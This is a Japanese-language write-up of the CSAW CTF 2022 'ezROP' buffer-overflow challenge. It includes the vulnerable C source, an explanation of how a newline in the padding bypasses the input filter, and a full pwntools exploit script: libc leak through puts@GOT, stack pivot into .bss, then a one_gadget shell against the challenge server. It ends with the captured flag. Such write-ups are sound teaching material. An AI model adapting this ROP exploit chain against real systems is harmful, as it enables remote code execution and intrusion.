# CSAW CTF 2022 `ezROP [pwn]` writeup

## 問題
This is a simple buffer overflow challenge, but I wrote it in a reversed way :)

`nc pwn.chal.csaw.io 5002`

実行ファイルとソースコード、リモート環境をエミュレートするためのDockerfile群が提供される。

```c
#include <stdio.h>
#include <ctype.h>
int init(){
    fclose(stderr);
    setvbuf(stdin,  0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}
int check(char *s){
    char *ptr = s;
    while(*ptr!=0)
    {
        if(*ptr=='\n')
        {
            *ptr = 0; break;
        }
        if(isalpha(*ptr) || *ptr==' ')
            ptr++;
        else
        {
            puts("Hey Hacker! Welcome to CSAW'22!");
            exit(1);
        }
    }
    printf("Nice to meet you, %s! Welcome to CSAW'22!\n",s);
    return 1;
}
char * str1 = "My friend, what's your name?";
void readn(char * buf, size_t len){
    if(read(0,buf,len)<=0)
        exit(1);
    return ;
}
void vul(void *buf){
    size_t rdi = 0x00000000004015a3;
    size_t rsi = rdi-2;
    size_t rop[0x100]; 
    size_t ct = 0 ; 
    memset(rop,0,sizeof(rop));

    rop[ct++] = buf+0x70; // real ret address
    rop[ct++] = rdi;
    rop[ct++] = str1;
    rop[ct++] = puts;

    rop[ct++] = rsi;
    rop[ct++] = 0x100; // rsi
    rop[ct++] = 0x999; // Pad

    rop[ct++] = rdi; 
    rop[ct++] = buf; // rdi

    rop[ct++] = readn;

    rop[ct++] = rdi;
    rop[ct++] = buf;
    rop[ct++] = check;

    rop[ct++] = 0x40152d;

    rop[0x104] = rop;
    return ;
}
int main(){
    char buf[100];
    init();
    vul(buf);
}
```

## 解法
セキュリティ機構の確認から。

```
[*] '/home/caffeine/ctf/csawctf22/pwn/ezrop/chal/ezROP'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Stack Buffer OverflowでROP組むっぽい。

ソースコードを見るとvul()が大変なことに。
ROPの形で`read(0, buf, 0x100)`を作って標準入力を受け取っている (プログラム内で自らリターンアドレス壊してるの面白い)。

入力はローカル変数に0x100バイト、入力を受け取った後に非アルファベットが含まれていないかチェックが入る。
このチェックが杜撰で、buf内を改行文字まで確認して満足している。
read()は改行で止まらないので、パディングに改行を含めればOK。

本命のROPは2段階。
1段階目ではlibc leakしてから.bssセクションへの入力を受け付けてstck pivotする。
2段階目ではリークしたlibcのアドレスからone gadgetの絶対アドレスを計算してシェルを奪う。
libcはDockerから取ってきた。

## Exploit
特に言うこともないが、stack pivotした後なら絶対アドレス書き込みができるので`system("/bin/sh")`を自分で作り出すほうが確実かも。

```py
from concurrent.futures import process
from pwn import *
import sys

elf = ELF("chal/ezROP")
libc = ELF("libc.so.6")
io = process(elf.path)
io = remote("pwn.chal.csaw.io", 5002)

# gdb.attach(io, 'b *0x40152d')

one_gadget = 0xe3afe

bss_base_addr = 0x404080
pop_rdi_ret = 0x4015a3
pop_rsi_r15_ret = 0x4015a1
pop_rsp_r13_r14_r15_ret = 0x40159d
pop_r12_r13_r14_r15_ret = 0x40159c

# libc leak & stack pivot
payload = b'A' * 0x77
payload += b'\n'
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(pop_rdi_ret)
payload += p64(bss_base_addr + 0x18)
payload += p64(pop_rsi_r15_ret)
payload += p64(0x100)
payload += p64(0)
payload += p64(elf.sym["readn"])
payload += p64(pop_rsp_r13_r14_r15_ret)
payload += p64(bss_base_addr)
io.send(payload)

io.recvuntil(b"CSAW'22!\n")
ret = io.recv(6)
libc.address = u64(ret + b"\x00\x00") - libc.sym["puts"]
print("libc: " + str(hex(libc.address)))

# one gadget
payload = p64(pop_r12_r13_r14_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(libc.address + one_gadget)
io.send(payload)

io.interactive()
```

FLAG: `flag{53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4}`